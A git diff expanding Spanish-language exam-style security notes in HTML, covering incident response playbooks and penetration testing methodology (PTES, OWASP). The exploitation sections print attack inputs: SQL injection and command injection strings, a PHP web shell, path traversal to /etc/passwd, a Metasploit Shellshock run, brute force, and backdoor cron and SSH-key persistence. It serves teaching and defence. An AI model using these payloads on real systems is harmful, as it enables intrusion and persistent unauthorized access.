@@ -646,22 +646,1077 @@ https://example.com/download?file=../../../../etc/passwd</code></pre>
         <li>Análisis de malware: sandboxing, dynamic/static analysis</li>
     </ul>
 
-    <h3>8.3 Respuesta a incidentes</h3>
+    <h3>8.3 Respuesta a incidentes (Incident Response)</h3>
+    <p>Proceso estructurado para gestionar y mitigar incidentes de seguridad. Basado en el framework NIST SP 800-61.</p>
+
+    <h4>Ciclo de vida de respuesta a incidentes</h4>
     <ol>
-        <li>Preparación (planes, playbooks, formación)</li>
-        <li>Identificación</li>
-        <li>Contención (limitar alcance)</li>
-        <li>Erradicación (eliminar causa raíz)</li>
-        <li>Recuperación (restaurar servicios)</li>
-        <li>Lecciones aprendidas (post-mortem)</li>
+        <li><strong>Preparación:</strong> planes, playbooks, formación, herramientas</li>
+        <li><strong>Identificación:</strong> detectar y confirmar el incidente</li>
+        <li><strong>Contención:</strong> limitar alcance y prevenir propagación</li>
+        <li><strong>Erradicación:</strong> eliminar causa raíz y artefactos maliciosos</li>
+        <li><strong>Recuperación:</strong> restaurar servicios y operaciones normales</li>
+        <li><strong>Lecciones aprendidas:</strong> post-mortem y mejora continua</li>
     </ol>
 
-    <h2>9. Evaluación de seguridad: pentesting y auditorías</h2>
+    <h3>8.4 Playbooks de respuesta a incidentes</h3>
+    <p>Procedimientos documentados paso a paso para responder a tipos específicos de incidentes. Reducen tiempo de respuesta y aseguran consistencia.</p>
+
+    <h4>Playbook 1: Ransomware</h4>
+    <div class="alert alert-danger">
+        <h5>🚨 Detección inicial</h5>
+        <ul class="mb-0">
+            <li>Alertas de cifrado masivo de archivos</li>
+            <li>Extensiones de archivo cambiadas (.encrypted, .locked)</li>
+            <li>Notas de rescate en directorios</li>
+            <li>Procesos sospechosos con alta actividad de I/O</li>
+        </ul>
+    </div>
+
+    <h5>Fase 1: Contención inmediata (primeros 15 minutos)</h5>
+    <pre><code># 1. Aislar sistemas afectados de la red
+# Desconectar interfaces de red (NO apagar el sistema)
+ip link set eth0 down
+# O físicamente desconectar cable de red
+
+# 2. Identificar sistemas comprometidos
+# Buscar procesos sospechosos
+ps aux | grep -E "encrypt|ransom|lock"
+netstat -antp | grep ESTABLISHED
+
+# 3. Preservar evidencia volátil
+# Capturar memoria RAM
+sudo dd if=/dev/mem of=/mnt/usb/memory_$(hostname)_$(date +%Y%m%d_%H%M%S).dump bs=1M
+
+# 4. Documentar
+echo "$(date): Sistema $(hostname) aislado - Ransomware detectado" >> /var/log/incident.log</code></pre>
+
+    <h5>Fase 2: Evaluación (30-60 minutos)</h5>
     <ul>
-        <li><strong>Vulnerability Assessment:</strong> escaneo automatizado (Nessus, OpenVAS) y priorización de fallos</li>
-        <li><strong>Pentest (penetration testing):</strong> pruebas manuales y explotación controlada para evaluar impacto</li>
-        <li><strong>Red Team / Blue Team:</strong> ejercicios adversarios vs defensores</li>
+        <li><strong>Identificar variante:</strong> usar ID Ransomware, No More Ransom</li>
+        <li><strong>Alcance:</strong> cuántos sistemas afectados, qué datos cifrados</li>
+        <li><strong>Vector de entrada:</strong> phishing, RDP expuesto, vulnerabilidad</li>
+        <li><strong>Backups:</strong> verificar integridad y disponibilidad</li>
     </ul>
+
+    <h5>Fase 3: Erradicación</h5>
+    <pre><code># 1. Eliminar persistencia
+# Buscar tareas programadas maliciosas
+crontab -l
+cat /etc/cron*/*
+
+# 2. Eliminar binarios maliciosos
+find / -name "*ransom*" -o -name "*encrypt*" 2>/dev/null
+rm -f /tmp/malware.exe
+
+# 3. Cambiar todas las credenciales
+passwd root
+# Rotar claves SSH, tokens, API keys
+
+# 4. Aplicar parches
+apt update && apt upgrade -y</code></pre>
+
+    <h5>Fase 4: Recuperación</h5>
+    <ul>
+        <li>Restaurar desde backups verificados (offline, anteriores a la infección)</li>
+        <li>Reconstruir sistemas desde imágenes limpias si es necesario</li>
+        <li>Validar integridad de datos restaurados</li>
+        <li>Reconectar gradualmente a la red con monitorización</li>
+    </ul>
+
+    <h5>Fase 5: Post-incidente</h5>
+    <ul>
+        <li>Documentar timeline completo del incidente</li>
+        <li>Identificar gaps en controles de seguridad</li>
+        <li>Implementar mejoras: segmentación, MFA, EDR, backups offline</li>
+        <li>Formación a usuarios sobre phishing</li>
+    </ul>
+
+    <h4>Playbook 2: Compromiso de cuenta (Account Takeover)</h4>
+    <div class="alert alert-warning">
+        <h5>⚠️ Indicadores</h5>
+        <ul class="mb-0">
+            <li>Logins desde ubicaciones inusuales</li>
+            <li>Múltiples intentos fallidos seguidos de éxito</li>
+            <li>Cambios de configuración no autorizados</li>
+            <li>Actividad fuera de horario laboral</li>
+        </ul>
+    </div>
+
+    <h5>Respuesta inmediata</h5>
+    <pre><code># 1. Suspender cuenta comprometida
+# AWS
+aws iam update-login-profile --user-name compromised-user --password-reset-required
+
+# Azure AD
+az ad user update --id user@domain.com --account-enabled false
+
+# Linux
+usermod -L compromised-user
+
+# 2. Revocar sesiones activas
+# AWS
+aws iam delete-access-key --user-name compromised-user --access-key-id AKIAIOSFODNN7EXAMPLE
+
+# 3. Revisar actividad reciente
+# AWS CloudTrail
+aws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=compromised-user --start-time 2025-01-01T00:00:00Z
+
+# Linux
+last -f /var/log/wtmp compromised-user
+grep compromised-user /var/log/auth.log</code></pre>
+
+    <h5>Investigación</h5>
+    <ul>
+        <li>Identificar acciones realizadas por el atacante</li>
+        <li>Recursos accedidos o modificados</li>
+        <li>Datos exfiltrados</li>
+        <li>Persistencia establecida (nuevas cuentas, claves SSH, backdoors)</li>
+    </ul>
+
+    <h5>Remediación</h5>
+    <ul>
+        <li>Resetear contraseña con proceso seguro (verificación fuera de banda)</li>
+        <li>Habilitar MFA obligatorio</li>
+        <li>Revisar y revocar permisos excesivos</li>
+        <li>Rotar credenciales de sistemas accedidos</li>
+        <li>Notificar al usuario y proporcionar guía de seguridad</li>
+    </ul>
+
+    <h4>Playbook 3: Ataque DDoS</h4>
+    <div class="alert alert-info">
+        <h5>📊 Síntomas</h5>
+        <ul class="mb-0">
+            <li>Servicio inaccesible o extremadamente lento</li>
+            <li>Ancho de banda saturado</li>
+            <li>CPU/memoria al 100% en servidores</li>
+            <li>Logs con tráfico masivo desde múltiples IPs</li>
+        </ul>
+    </div>
+
+    <h5>Respuesta inmediata</h5>
+    <pre><code># 1. Identificar tipo de ataque
+# Volumétrico (UDP flood, amplification)
+tcpdump -i eth0 -n udp | head -100
+
+# SYN flood
+netstat -an | grep SYN_RECV | wc -l
+
+# HTTP flood
+tail -f /var/log/nginx/access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head
+
+# 2. Activar protección DDoS
+# Cloudflare - activar "Under Attack Mode"
+# AWS Shield Advanced
+# Rate limiting en firewall
+
+# 3. Bloquear IPs atacantes (temporal)
+# iptables
+iptables -A INPUT -s 192.0.2.0/24 -j DROP
+
+# nginx rate limiting
+limit_req_zone $binary_remote_addr zone=ddos:10m rate=10r/s;
+limit_req zone=ddos burst=20;</code></pre>
+
+    <h5>Mitigación</h5>
+    <ul>
+        <li><strong>CDN/WAF:</strong> activar Cloudflare, Akamai, AWS CloudFront</li>
+        <li><strong>Anycast:</strong> distribuir tráfico geográficamente</li>
+        <li><strong>Scrubbing centers:</strong> filtrar tráfico malicioso</li>
+        <li><strong>Blackhole routing:</strong> descartar tráfico a IPs específicas</li>
+        <li><strong>Escalado automático:</strong> aumentar capacidad temporalmente</li>
+    </ul>
+
+    <h5>Comunicación</h5>
+    <ul>
+        <li>Notificar a stakeholders sobre el incidente</li>
+        <li>Actualizar página de estado del servicio</li>
+        <li>Contactar ISP/proveedor de hosting</li>
+        <li>Considerar denuncia a autoridades si es ataque dirigido</li>
+    </ul>
+
+    <h4>Playbook 4: Phishing / Credential Harvesting</h4>
+    <div class="alert alert-warning">
+        <h5>🎣 Detección</h5>
+        <ul class="mb-0">
+            <li>Usuarios reportan emails sospechosos</li>
+            <li>Dominio similar al corporativo registrado recientemente</li>
+            <li>Página de login falsa detectada</li>
+            <li>Aumento de intentos de login fallidos</li>
+        </ul>
+    </div>
+
+    <h5>Respuesta inmediata</h5>
+    <pre><code># 1. Bloquear dominio/URL maliciosa
+# En firewall/proxy
+iptables -A OUTPUT -d malicious-domain.com -j DROP
+
+# En DNS (Pi-hole, etc)
+echo "0.0.0.0 malicious-domain.com" >> /etc/hosts
+
+# 2. Bloquear emails del remitente
+# Regla en Exchange/Gmail
+# Añadir a blacklist de spam filter
+
+# 3. Identificar usuarios que hicieron clic
+# Revisar logs de proxy/firewall
+grep "malicious-domain.com" /var/log/squid/access.log
+
+# 4. Resetear credenciales de usuarios afectados
+for user in $(cat affected_users.txt); do
+    passwd -e $user  # forzar cambio en próximo login
+done</code></pre>
+
+    <h5>Análisis</h5>
+    <ul>
+        <li>Obtener copia del email malicioso (headers completos)</li>
+        <li>Analizar enlaces y archivos adjuntos en sandbox</li>
+        <li>Identificar infraestructura del atacante (dominio, hosting, IPs)</li>
+        <li>Buscar IoCs (Indicators of Compromise) en sistemas</li>
+    </ul>
+
+    <h5>Remediación</h5>
+    <ul>
+        <li>Enviar comunicación a todos los usuarios alertando del phishing</li>
+        <li>Proporcionar capturas del email malicioso para reconocimiento</li>
+        <li>Reportar dominio/URL a Google Safe Browsing, PhishTank</li>
+        <li>Contactar registrar del dominio para takedown</li>
+        <li>Implementar DMARC, SPF, DKIM si no están configurados</li>
+        <li>Formación de concienciación en seguridad</li>
+    </ul>
+
+    <h4>Playbook 5: Malware / Backdoor</h4>
+    <div class="alert alert-danger">
+        <h5>🦠 Indicadores</h5>
+        <ul class="mb-0">
+            <li>Proceso desconocido con alta actividad de red</li>
+            <li>Conexiones a IPs/dominios sospechosos</li>
+            <li>Archivos modificados inesperadamente</li>
+            <li>Alertas de antivirus/EDR</li>
+        </ul>
+    </div>
+
+    <h5>Contención</h5>
+    <pre><code># 1. Aislar sistema
+ip link set eth0 down
+
+# 2. Identificar proceso malicioso
+ps aux | grep -v "\[" | sort -k3 -rn | head
+lsof -i -P -n | grep ESTABLISHED
+
+# 3. Capturar evidencia
+# Proceso en ejecución
+ps aux > /mnt/usb/processes_$(date +%Y%m%d_%H%M%S).txt
+lsof -p <PID> > /mnt/usb/process_<PID>_files.txt
+
+# Conexiones de red
+netstat -antp > /mnt/usb/connections_$(date +%Y%m%d_%H%M%S).txt
+
+# Archivos modificados recientemente
+find / -type f -mtime -1 > /mnt/usb/recent_files.txt
+
+# 4. Terminar proceso (después de capturar evidencia)
+kill -9 <PID></code></pre>
+
+    <h5>Análisis</h5>
+    <pre><code># 1. Extraer binario malicioso
+cp /proc/<PID>/exe /mnt/usb/malware_sample
+
+# 2. Hash del archivo
+sha256sum /mnt/usb/malware_sample
+
+# 3. Buscar en VirusTotal
+curl --request POST \
+  --url https://www.virustotal.com/api/v3/files \
+  --header 'x-apikey: YOUR_API_KEY' \
+  --form file=@/mnt/usb/malware_sample
+
+# 4. Análisis estático
+strings /mnt/usb/malware_sample | grep -E "http|ftp|\.exe|\.dll"
+file /mnt/usb/malware_sample
+
+# 5. Buscar persistencia
+# Cron jobs
+crontab -l
+cat /etc/cron*/*
+
+# Systemd services
+systemctl list-unit-files | grep enabled
+
+# Startup scripts
+ls -la /etc/rc*.d/
+cat ~/.bashrc ~/.bash_profile</code></pre>
+
+    <h5>Erradicación</h5>
+    <ul>
+        <li>Eliminar binario malicioso y artefactos</li>
+        <li>Remover mecanismos de persistencia</li>
+        <li>Aplicar parches de vulnerabilidad explotada</li>
+        <li>Considerar reinstalación completa si rootkit sospechado</li>
+    </ul>
+
+    <h3>8.5 Herramientas para respuesta a incidentes</h3>
+    <table class="table table-striped">
+        <thead>
+            <tr>
+                <th>Categoría</th>
+                <th>Herramientas</th>
+                <th>Uso</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr><td>Análisis de red</td><td>Wireshark, tcpdump, NetworkMiner</td><td>Captura y análisis de tráfico</td></tr>
+            <tr><td>Análisis de memoria</td><td>Volatility, Rekall, LiME</td><td>Análisis forense de RAM</td></tr>
+            <tr><td>Análisis de disco</td><td>Autopsy, FTK, EnCase</td><td>Forense de sistemas de archivos</td></tr>
+            <tr><td>Análisis de malware</td><td>Cuckoo Sandbox, Any.run, IDA Pro</td><td>Análisis dinámico y estático</td></tr>
+            <tr><td>SIEM</td><td>Splunk, ELK, QRadar</td><td>Correlación de eventos</td></tr>
+            <tr><td>EDR</td><td>CrowdStrike, SentinelOne, Carbon Black</td><td>Detección y respuesta en endpoints</td></tr>
+            <tr><td>Threat Intelligence</td><td>MISP, OpenCTI, ThreatConnect</td><td>IoCs y contexto de amenazas</td></tr>
+        </tbody>
+    </table>
+
+    <h3>8.6 Métricas de respuesta a incidentes</h3>
+    <ul>
+        <li><strong>MTTD (Mean Time to Detect):</strong> tiempo promedio desde inicio del incidente hasta detección</li>
+        <li><strong>MTTR (Mean Time to Respond):</strong> tiempo desde detección hasta inicio de respuesta</li>
+        <li><strong>MTTC (Mean Time to Contain):</strong> tiempo para contener el incidente</li>
+        <li><strong>MTTR (Mean Time to Recover):</strong> tiempo total hasta recuperación completa</li>
+        <li><strong>Número de incidentes por categoría:</strong> phishing, malware, DDoS, etc.</li>
+        <li><strong>Falsos positivos:</strong> alertas que no son incidentes reales</li>
+    </ul>
+
+    <h3>8.7 Comunicación durante incidentes</h3>
+    
+    <h4>Stakeholders clave</h4>
+    <ul>
+        <li><strong>Equipo técnico:</strong> actualizaciones técnicas detalladas</li>
+        <li><strong>Management:</strong> resumen ejecutivo, impacto en negocio</li>
+        <li><strong>Legal:</strong> implicaciones legales, notificaciones obligatorias</li>
+        <li><strong>Comunicación:</strong> mensajes públicos, relaciones con prensa</li>
+        <li><strong>Usuarios afectados:</strong> qué pasó, qué hacer, cómo protegerse</li>
+        <li><strong>Autoridades:</strong> INCIBE, policía, reguladores (GDPR)</li>
+    </ul>
+
+    <h4>Plantilla de comunicación de incidente</h4>
+    <pre><code>ASUNTO: [URGENTE] Incidente de seguridad - [TIPO] - [FECHA]
+
+RESUMEN EJECUTIVO:
+- Qué: [Tipo de incidente]
+- Cuándo: [Fecha/hora de detección]
+- Impacto: [Sistemas/datos afectados]
+- Estado: [Contenido/En investigación/Resuelto]
+
+DETALLES:
+- Vector de ataque: [Cómo ocurrió]
+- Alcance: [Cuántos sistemas/usuarios]
+- Datos comprometidos: [Sí/No, qué tipo]
+
+ACCIONES TOMADAS:
+1. [Contención]
+2. [Erradicación]
+3. [Recuperación]
+
+PRÓXIMOS PASOS:
+- [Timeline de recuperación]
+- [Medidas preventivas]
+
+CONTACTO:
+- Equipo de seguridad: security@company.com
+- Teléfono de emergencia: +34 XXX XXX XXX</code></pre>
+
+    <h3>8.8 Documentación post-incidente</h3>
+    
+    <h4>Informe de incidente (estructura)</h4>
+    <ol>
+        <li><strong>Resumen ejecutivo</strong>
+            <ul>
+                <li>Qué ocurrió, cuándo, impacto</li>
+            </ul>
+        </li>
+        <li><strong>Timeline detallado</strong>
+            <ul>
+                <li>Cronología de eventos con timestamps</li>
+            </ul>
+        </li>
+        <li><strong>Análisis técnico</strong>
+            <ul>
+                <li>Vector de ataque, técnicas utilizadas (MITRE ATT&CK)</li>
+                <li>IoCs (hashes, IPs, dominios)</li>
+            </ul>
+        </li>
+        <li><strong>Respuesta y contención</strong>
+            <ul>
+                <li>Acciones tomadas, efectividad</li>
+            </ul>
+        </li>
+        <li><strong>Impacto</strong>
+            <ul>
+                <li>Sistemas afectados, datos comprometidos, coste</li>
+            </ul>
+        </li>
+        <li><strong>Lecciones aprendidas</strong>
+            <ul>
+                <li>Qué funcionó, qué no</li>
+                <li>Gaps identificados</li>
+            </ul>
+        </li>
+        <li><strong>Recomendaciones</strong>
+            <ul>
+                <li>Mejoras técnicas y de proceso</li>
+                <li>Timeline de implementación</li>
+            </ul>
+        </li>
+    </ol>
+
+    <h4>Mapeo a MITRE ATT&CK</h4>
+    <p>Documentar técnicas del atacante usando el framework MITRE ATT&CK para mejor comprensión y defensa.</p>
+    <table class="table table-sm">
+        <thead>
+            <tr>
+                <th>Táctica</th>
+                <th>Técnica</th>
+                <th>Ejemplo</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr><td>Initial Access</td><td>T1566 - Phishing</td><td>Email con adjunto malicioso</td></tr>
+            <tr><td>Execution</td><td>T1059 - Command and Scripting</td><td>PowerShell script</td></tr>
+            <tr><td>Persistence</td><td>T1053 - Scheduled Task</td><td>Cron job malicioso</td></tr>
+            <tr><td>Privilege Escalation</td><td>T1068 - Exploit Vulnerability</td><td>CVE-2024-XXXX</td></tr>
+            <tr><td>Defense Evasion</td><td>T1070 - Indicator Removal</td><td>Borrar logs</td></tr>
+            <tr><td>Credential Access</td><td>T1003 - Credential Dumping</td><td>Mimikatz</td></tr>
+            <tr><td>Discovery</td><td>T1018 - Remote System Discovery</td><td>Escaneo de red</td></tr>
+            <tr><td>Lateral Movement</td><td>T1021 - Remote Services</td><td>RDP, SSH</td></tr>
+            <tr><td>Collection</td><td>T1005 - Data from Local System</td><td>Exfiltrar archivos</td></tr>
+            <tr><td>Exfiltration</td><td>T1041 - C2 Channel</td><td>Enviar datos a C2</td></tr>
+            <tr><td>Impact</td><td>T1486 - Data Encrypted for Impact</td><td>Ransomware</td></tr>
+        </tbody>
+    </table>
+
+    <div class="alert alert-success">
+        <h5>💡 Mejores prácticas</h5>
+        <ul class="mb-0">
+            <li><strong>Preparación es clave:</strong> playbooks actualizados, herramientas listas, equipo entrenado</li>
+            <li><strong>Documentar todo:</strong> cada acción, timestamp, evidencia</li>
+            <li><strong>Comunicación clara:</strong> mantener informados a stakeholders</li>
+            <li><strong>No apagar sistemas:</strong> preservar evidencia volátil (memoria)</li>
+            <li><strong>Cadena de custodia:</strong> mantener integridad de evidencias</li>
+            <li><strong>Aprender y mejorar:</strong> cada incidente es oportunidad de fortalecer defensas</li>
+        </ul>
+    </div>
+
+    <div class="alert alert-info">
+        <h5>💡 Para examen</h5>
+        <ul class="mb-0">
+            <li>Ciclo de IR: Preparación → Identificación → Contención → Erradicación → Recuperación → Lecciones aprendidas</li>
+            <li>Playbooks = procedimientos documentados para tipos específicos de incidentes</li>
+            <li>Contención primero: aislar antes de investigar en profundidad</li>
+            <li>Preservar evidencia: memoria volátil primero, luego disco</li>
+            <li>Documentar con MITRE ATT&CK para análisis estructurado</li>
+            <li>Métricas: MTTD, MTTR, MTTC para medir efectividad</li>
+        </ul>
+    </div>
+
+    <h2>9. Evaluación de seguridad: pentesting y auditorías</h2>
+    
+    <h3>9.1 Tipos de evaluaciones de seguridad</h3>
+    <table class="table table-striped">
+        <thead>
+            <tr>
+                <th>Tipo</th>
+                <th>Descripción</th>
+                <th>Enfoque</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td><strong>Vulnerability Assessment</strong></td>
+                <td>Escaneo automatizado de vulnerabilidades</td>
+                <td>Identificar y priorizar fallos conocidos</td>
+            </tr>
+            <tr>
+                <td><strong>Penetration Testing</strong></td>
+                <td>Explotación controlada de vulnerabilidades</td>
+                <td>Evaluar impacto real y cadenas de ataque</td>
+            </tr>
+            <tr>
+                <td><strong>Red Team</strong></td>
+                <td>Simulación de adversario real</td>
+                <td>Objetivos específicos, técnicas avanzadas, sigilo</td>
+            </tr>
+            <tr>
+                <td><strong>Blue Team</strong></td>
+                <td>Defensa y detección</td>
+                <td>Monitorización, respuesta, mejora de controles</td>
+            </tr>
+            <tr>
+                <td><strong>Purple Team</strong></td>
+                <td>Colaboración Red + Blue</td>
+                <td>Mejorar detección y respuesta mediante feedback</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <h3>9.2 Tipos de pentesting según conocimiento</h3>
+    <ul>
+        <li><strong>Black Box:</strong> sin conocimiento previo del sistema (simula atacante externo)
+            <ul>
+                <li>Ventaja: perspectiva realista de atacante</li>
+                <li>Desventaja: puede no cubrir toda la superficie de ataque</li>
+            </ul>
+        </li>
+        <li><strong>White Box:</strong> conocimiento completo (código, arquitectura, credenciales)
+            <ul>
+                <li>Ventaja: cobertura exhaustiva</li>
+                <li>Desventaja: menos realista</li>
+            </ul>
+        </li>
+        <li><strong>Grey Box:</strong> conocimiento parcial (usuario estándar, documentación básica)
+            <ul>
+                <li>Ventaja: equilibrio entre cobertura y realismo</li>
+                <li>Más común en entornos corporativos</li>
+            </ul>
+        </li>
+    </ul>
+
+    <h3>9.3 Metodología PTES (Penetration Testing Execution Standard)</h3>
+    <p>Framework completo que define las fases de un pentest profesional.</p>
+
+    <h4>Fase 1: Pre-engagement (Preparación)</h4>
+    <p>Definir alcance, objetivos y reglas de compromiso.</p>
+    <ul>
+        <li><strong>Scope:</strong> sistemas en alcance, fuera de alcance, restricciones</li>
+        <li><strong>Objetivos:</strong> qué se quiere lograr (acceso a datos, escalada de privilegios, persistencia)</li>
+        <li><strong>Reglas de compromiso:</strong> horarios permitidos, técnicas prohibidas, contactos de emergencia</li>
+        <li><strong>Documentación legal:</strong> contrato, NDA, autorización por escrito</li>
+    </ul>
+
+    <h5>Ejemplo de documento de alcance</h5>
+    <pre><code>ALCANCE DEL PENTEST
+Cliente: Acme Corp
+Fecha: 2025-01-15 al 2025-01-22
+
+SISTEMAS EN ALCANCE:
+- Aplicación web: https://app.acme.com
+- API: https://api.acme.com
+- Rango IP: 203.0.113.0/24
+
+FUERA DE ALCANCE:
+- Sistemas de producción críticos (base de datos principal)
+- Ingeniería social física
+- DoS/DDoS
+
+OBJETIVOS:
+1. Identificar vulnerabilidades OWASP Top 10
+2. Evaluar controles de autenticación
+3. Probar escalada de privilegios
+
+RESTRICCIONES:
+- Horario: Lunes a Viernes, 9:00-18:00
+- No exfiltrar datos reales de clientes
+- Notificar inmediatamente vulnerabilidades críticas</code></pre>
+
+    <h4>Fase 2: Intelligence Gathering (Reconocimiento)</h4>
+    <p>Recopilar información sobre el objetivo.</p>
+
+    <h5>Reconocimiento pasivo (sin interactuar con el objetivo)</h5>
+    <pre><code># OSINT - Información pública
+# Whois
+whois acme.com
+
+# DNS
+dig acme.com ANY
+dig @8.8.8.8 acme.com MX
+nslookup -type=TXT acme.com
+
+# Subdominios
+subfinder -d acme.com
+amass enum -d acme.com
+
+# Búsqueda de empleados (LinkedIn)
+# Búsqueda de credenciales filtradas
+# Dehashed, Have I Been Pwned
+
+# Google Dorks
+site:acme.com filetype:pdf
+site:acme.com inurl:admin
+site:acme.com ext:sql | ext:db
+
+# Wayback Machine
+# Ver versiones antiguas del sitio</code></pre>
+
+    <h5>Reconocimiento activo (interacción directa)</h5>
+    <pre><code># Escaneo de puertos
+nmap -sS -sV -O -p- 203.0.113.10
+nmap -sC -sV -p 80,443 203.0.113.10
+
+# Escaneo de servicios web
+whatweb https://app.acme.com
+nikto -h https://app.acme.com
+
+# Enumeración de directorios
+gobuster dir -u https://app.acme.com -w /usr/share/wordlists/dirb/common.txt
+ffuf -u https://app.acme.com/FUZZ -w wordlist.txt
+
+# Tecnologías
+wappalyzer
+builtwith.com</code></pre>
+
+    <h4>Fase 3: Threat Modeling (Modelado de amenazas)</h4>
+    <p>Identificar vectores de ataque y priorizar según impacto.</p>
+    <ul>
+        <li>Mapear superficie de ataque</li>
+        <li>Identificar activos críticos</li>
+        <li>Determinar vectores de ataque más probables</li>
+        <li>Priorizar según riesgo (probabilidad × impacto)</li>
+    </ul>
+
+    <h4>Fase 4: Vulnerability Analysis (Análisis de vulnerabilidades)</h4>
+    <pre><code># Escaneo automatizado
+nmap --script vuln 203.0.113.10
+nessus
+openvas
+
+# Análisis de aplicación web
+# SQL Injection
+sqlmap -u "https://app.acme.com/product?id=1" --dbs
+
+# XSS
+# Probar payloads en campos de entrada
+
+# CSRF
+# Verificar tokens anti-CSRF
+
+# Análisis de configuración
+# SSL/TLS
+sslscan app.acme.com
+testssl.sh app.acme.com
+
+# Headers de seguridad
+curl -I https://app.acme.com</code></pre>
+
+    <h4>Fase 5: Exploitation (Explotación)</h4>
+    <p>Explotar vulnerabilidades identificadas de forma controlada.</p>
+    <pre><code># Metasploit
+msfconsole
+search apache
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+set RHOST 203.0.113.10
+set LHOST 192.168.1.100
+exploit
+
+# Explotación manual
+# SQL Injection para bypass de autenticación
+username: admin' OR '1'='1'--
+password: cualquiera
+
+# Command Injection
+; cat /etc/passwd
+| whoami
+`id`
+
+# File Upload malicioso
+# Subir shell PHP
+<?php system($_GET['cmd']); ?></code></pre>
+
+    <h4>Fase 6: Post-Exploitation (Post-explotación)</h4>
+    <p>Mantener acceso, escalar privilegios, pivotar.</p>
+    <pre><code># Escalada de privilegios (Linux)
+# Buscar SUID binaries
+find / -perm -4000 2>/dev/null
+
+# Kernel exploits
+uname -a
+searchsploit linux kernel 5.4
+
+# Sudo misconfiguration
+sudo -l
+
+# Persistencia
+# Añadir clave SSH
+echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
+
+# Cron job
+echo "* * * * * /tmp/backdoor.sh" | crontab -
+
+# Pivoting
+# Descubrir red interna
+ip addr
+arp -a
+
+# Port forwarding
+ssh -L 8080:internal-server:80 user@compromised-host
+
+# Exfiltración de datos (simulada)
+# Documentar qué datos se podrían exfiltrar
+# NO exfiltrar datos reales</code></pre>
+
+    <h4>Fase 7: Reporting (Reporte)</h4>
+    <p>Documentar hallazgos con evidencias y recomendaciones.</p>
+
+    <h5>Estructura del reporte</h5>
+    <ol>
+        <li><strong>Resumen ejecutivo</strong> (para management)
+            <ul>
+                <li>Objetivos del pentest</li>
+                <li>Resumen de hallazgos críticos</li>
+                <li>Nivel de riesgo general</li>
+                <li>Recomendaciones prioritarias</li>
+            </ul>
+        </li>
+        <li><strong>Metodología</strong>
+            <ul>
+                <li>Fases ejecutadas</li>
+                <li>Herramientas utilizadas</li>
+                <li>Limitaciones</li>
+            </ul>
+        </li>
+        <li><strong>Hallazgos técnicos</strong> (para equipo técnico)
+            <ul>
+                <li>Por cada vulnerabilidad:
+                    <ul>
+                        <li>Título y severidad (Crítica/Alta/Media/Baja)</li>
+                        <li>Descripción técnica</li>
+                        <li>Pasos para reproducir</li>
+                        <li>Evidencia (capturas, logs)</li>
+                        <li>Impacto</li>
+                        <li>Remediación</li>
+                        <li>Referencias (CVE, CWE, OWASP)</li>
+                    </ul>
+                </li>
+            </ul>
+        </li>
+        <li><strong>Conclusiones y recomendaciones</strong></li>
+        <li><strong>Anexos</strong> (logs completos, scripts utilizados)</li>
+    </ol>
+
+    <h5>Clasificación de severidad (CVSS)</h5>
+    <table class="table table-striped">
+        <thead>
+            <tr>
+                <th>Severidad</th>
+                <th>CVSS Score</th>
+                <th>Descripción</th>
+                <th>Ejemplo</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td class="text-danger"><strong>Crítica</strong></td>
+                <td>9.0-10.0</td>
+                <td>Explotación trivial, impacto máximo</td>
+                <td>RCE sin autenticación</td>
+            </tr>
+            <tr>
+                <td class="text-danger"><strong>Alta</strong></td>
+                <td>7.0-8.9</td>
+                <td>Fácil explotación, alto impacto</td>
+                <td>SQL Injection, XSS almacenado</td>
+            </tr>
+            <tr>
+                <td class="text-warning"><strong>Media</strong></td>
+                <td>4.0-6.9</td>
+                <td>Requiere condiciones específicas</td>
+                <td>CSRF, información sensible expuesta</td>
+            </tr>
+            <tr>
+                <td class="text-info"><strong>Baja</strong></td>
+                <td>0.1-3.9</td>
+                <td>Difícil explotación o bajo impacto</td>
+                <td>Falta de headers de seguridad</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <h3>9.4 Metodología OWASP Testing Guide</h3>
+    <p>Framework específico para testing de aplicaciones web. Versión actual: v4.2</p>
+
+    <h4>Categorías de testing OWASP</h4>
+
+    <h5>1. Information Gathering</h5>
+    <ul>
+        <li>Identificar tecnologías (servidor web, framework, CMS)</li>
+        <li>Mapear aplicación (sitemap, funcionalidades)</li>
+        <li>Identificar puntos de entrada (formularios, APIs, parámetros)</li>
+        <li>Fingerprinting de servidor y aplicación</li>
+    </ul>
+
+    <h5>2. Configuration and Deployment Management Testing</h5>
+    <pre><code># Configuración de red
+nmap -sV --script http-methods 203.0.113.10
+
+# Archivos sensibles
+curl https://app.acme.com/robots.txt
+curl https://app.acme.com/.git/config
+curl https://app.acme.com/backup.sql
+
+# Métodos HTTP permitidos
+curl -X OPTIONS https://app.acme.com -v
+
+# Configuración SSL/TLS
+testssl.sh app.acme.com</code></pre>
+
+    <h5>3. Identity Management Testing</h5>
+    <ul>
+        <li>Enumeración de usuarios</li>
+        <li>Políticas de contraseñas</li>
+        <li>Proceso de registro</li>
+        <li>Recuperación de contraseña</li>
+    </ul>
+
+    <h5>4. Authentication Testing</h5>
+    <pre><code># Credenciales por defecto
+admin:admin
+admin:password
+root:root
+
+# Brute force (con rate limiting)
+hydra -l admin -P passwords.txt https-post-form "/login:username=^USER^&password=^PASS^:Invalid"
+
+# Bypass de autenticación
+# SQL Injection
+username: admin' OR '1'='1'--
+
+# Session fixation
+# Verificar si session ID cambia después de login
+
+# Fuerza de sesión
+# Predecibilidad de tokens
+# Longitud y entropía</code></pre>
+
+    <h5>5. Authorization Testing</h5>
+    <pre><code># Path traversal
+https://app.acme.com/download?file=../../../../etc/passwd
+
+# IDOR (Insecure Direct Object Reference)
+# Usuario A accede a recurso de usuario B
+https://app.acme.com/profile?user_id=123
+https://app.acme.com/profile?user_id=124
+
+# Privilege escalation
+# Usuario normal accede a funciones de admin
+https://app.acme.com/admin/users
+
+# Verificar controles de autorización en API
+curl -H "Authorization: Bearer USER_TOKEN" https://api.acme.com/admin/users</code></pre>
+
+    <h5>6. Session Management Testing</h5>
+    <ul>
+        <li>Cookies: Secure, HttpOnly, SameSite flags</li>
